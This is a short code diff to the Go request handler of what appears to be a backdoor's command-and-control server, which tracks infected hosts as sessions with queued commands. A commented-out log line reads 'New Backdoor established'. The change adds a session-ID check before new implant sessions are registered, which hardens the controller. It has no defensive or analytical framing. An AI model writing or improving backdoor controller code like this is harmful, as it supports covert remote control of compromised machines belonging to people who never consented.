@@ -222,7 +222,9 @@ func Handle(w http.ResponseWriter, r *http.Request) {
 			}
 		}
 
-		sessions = append(sessions, joker_config{_Auth: SessionID,_Self: Self,_Os: Os,_command: "None",_Addr: Address,_Active:time.Now().UTC().Unix()})
+		if VerifySessionID(SessionID) {
+			sessions = append(sessions, joker_config{_Auth: SessionID,_Self: Self,_Os: Os,_command: "None",_Addr: Address,_Active:time.Now().UTC().Unix()})
+		}
 		// fmt.Println("[127.0.0.1] New Backdoor established", SessionID,Self,Os)
 	} else if JOKER == "?" {
 		for i:=0;i<len(sessions);i++ {
